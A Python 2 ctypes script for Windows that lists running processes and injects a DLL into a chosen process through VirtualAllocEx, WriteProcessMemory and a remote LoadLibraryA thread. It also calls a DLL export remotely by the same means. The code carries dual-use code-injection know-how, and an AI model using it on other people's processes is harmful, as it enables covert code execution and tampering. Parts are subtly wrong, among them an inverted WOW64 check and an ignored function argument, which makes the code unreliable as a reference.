import sys
from ctypes.wintypes import *
from ctypes import  *
import collections
 
kernel32 = windll.kernel32

PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )

class tagPROCESSENTRY32(Structure):
    _fields_ = [('dwSize',              DWORD),
                ('cntUsage',            DWORD),
                ('th32ProcessID',       DWORD),
                ('th32DefaultHeapID',   POINTER(ULONG)),
                ('th32ModuleID',        DWORD),
                ('cntThreads',          DWORD),
                ('th32ParentProcessID', DWORD),
                ('pcPriClassBase',      LONG),
                ('dwFlags',             DWORD),
                ('szExeFile',           c_char * 260)]
 
 


PAGE_READWRITE     =     0x04
PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32

# pid      = sys.argv[2]
 
def enumProcess():
    """
    return a namedtuple's list (for p in this p.processName p.processID)
    """
    hSnapshot = kernel32.CreateToolhelp32Snapshot(15, 0)
    fProcessEntry32 = tagPROCESSENTRY32()
    processClass = collections.namedtuple("processInfo","processName processID")
    processSet = []
    #if hSnapshot:
    fProcessEntry32.dwSize = sizeof(fProcessEntry32)
    listloop = kernel32.Process32First(hSnapshot, byref(fProcessEntry32))
    while listloop:
        processName = (fProcessEntry32.szExeFile)
        processID = fProcessEntry32.th32ProcessID
        processSet.append(processClass(processName, processID))
        listloop = kernel32.Process32Next(hSnapshot, byref(fProcessEntry32))
    return processSet

def is_wow64_process(pid):
    i = c_int()
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
    kernel32.IsWow64Process(h_process, byref(i)) 
    kernel32.CloseHandle(h_process)
    return i.value != 1


def dll_inject(pid,dll_path):
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
    if not h_process:
        print "[*] Couldn't acquire a handle to PID: %s" % pid
        return
        #sys.exit(0)

    dll_len  = len(dll_path)
    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx( h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    # Write the DLL path into the allocated space
    written = c_int(0)
    
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

    # We need to resolve the address for LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib  = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")

    # Now we try to create the remote thread, with the entry point set
    # to LoadLibraryA and a pointer to the DLL path as it's single parameter
    thread_id = c_ulong(0)
    t_handle = kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id))
    if not t_handle:
        print "[*] Failed to inject the DLL. Exiting."
        return
        #sys.exit(0)

    kernel32.CloseHandle(h_process)
    print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
    
    return t_handle


def call_export(pid, module, function, argument):
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
    if not h_process:
        print "[*] Couldn't acquire a handle to PID: %s" % pid
        return
        #sys.exit(0)

    argument_len  = len(argument)
    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx( h_process, 0, argument_len, VIRTUAL_MEM, PAGE_READWRITE)

    # Write the DLL path into the allocated space
    written = c_int(0)
    
    kernel32.WriteProcessMemory(h_process, arg_address, argument, argument_len, byref(written))

    # We need to resolve the address for LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA(module)
    print h_kernel32
    h_loadlib  = kernel32.GetProcAddress(h_kernel32, "LOGGER_setLogFile")
    print h_loadlib

    # Now we try to create the remote thread, with the entry point set
    # to LoadLibraryA and a pointer to the DLL path as it's single parameter
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process,None,0,h_loadlib,arg_address,0,byref(thread_id)):
        print "[*] Failed to inject the DLL. Exiting."
        return
        #sys.exit(0)
    kernel32.CloseHandle(h_process)
    print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
